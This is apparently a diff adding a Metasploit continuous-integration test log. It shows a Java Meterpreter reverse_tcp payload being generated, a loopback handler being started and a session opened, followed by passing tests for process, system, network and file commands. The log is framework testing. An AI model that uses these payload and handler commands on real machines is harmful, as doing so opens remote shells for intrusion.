@@ -1,0 +1,79 @@
+use java/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-1623-y06o7t.jar -f jar AutoVerifySessionTimeout=10 spawn=0 lport=6016 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> [*] Writing 5265 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-1623-y06o7t.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 15
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6016 
+[*] Sending stage (58075 bytes) to 127.0.0.1
+[*] Meterpreter session 16 opened (127.0.0.1:6016 -> 127.0.0.1:49389 ) at 2022-02-03 22:52:49 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=16 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to /tmp
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: osx
+[*] Running against session 16
+[*] Session type is meterpreter and platform is osx
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] Pid: 4179
+[+] should return its own process id
+[*] PID info: {"pid"=>4179, "ppid"=>nil, "name"=>"/usr/bin/java", "path"=>"/usr/bin/java -jar /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-1623-y06o7t.jar", "session"=>nil, "user"=>"runner", "arch"=>nil}
+[+] should return a list of processes
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[+] should return the proper directory separator
+[*] CWD: /private/tmp
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] Current directory: "/private/tmp"
+[*] Stat of current directory: #<#<Class:0x00007fda85895c30>:0x00007fda84a303e8 @stathash={"st_dev"=>0, "st_mode"=>16894, "st_nlink"=>1, "st_uid"=>65535, "st_gid"=>65535, "st_rdev"=>0, "st_ino"=>0, "st_size"=>128, "st_atime"=>1643928766, "st_mtime"=>1643928766, "st_ctime"=>1643928766}>
+[+] should stat a directory
+[*] Directory Name: meterpreter-test-dir-ermyvjhq
+[*] Directory created successfully
+[*] Directory removed successfully
+[+] should create and remove a dir
+[*] Directory Name: meterpreter-test-dir-ermyvjhq
+[*] Directory created successfully
+[*] Old CWD: /private/tmp
+[*] New CWD: /private/tmp/meterpreter-test-dir-ermyvjhq
+[*] Back to old CWD: /private/tmp
+[*] Directory removed successfully
+[+] should change directories
+[*] File Name: meterpreter-test-ermyvjhq
+[*] Wrote to meterpreter-test-ermyvjhq, checking contents
+[*] Wrote test
+[+] should create and remove files
+[*] Remote File Name: meterpreter-test-file-ermyvjhq.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[+] should upload a file
+[*] Source File Name: meterpreter-test-ermyvjhq
+[*] Destination File Name: meterpreter-test-ermyvjhq-moved
+[+] should move files
+[*] Source File Name: meterpreter-test-ermyvjhq
+[*] Destination File Name: meterpreter-test-ermyvjhq-copied
+[+] should copy files
+[*] Remote File Name: meterpreter-test-file-ermyvjhq.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[*] remote md5: 0100992fb5a848a10ca1ebdb9497977e
+[*] local md5 : 0100992fb5a848a10ca1ebdb9497977e
+[*] remote sha: ea9ce50e1c219779e1de3a1fc673f59d093477bc
+[*] local sha : ea9ce50e1c219779e1de3a1fc673f59d093477bc
+[+] should do md5 and sha1 of files
+[*] Testing complete in 1.767589
+[*] Passed: 20; Failed: 0
+[*] Cleanup: changing working directory back to /Users/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
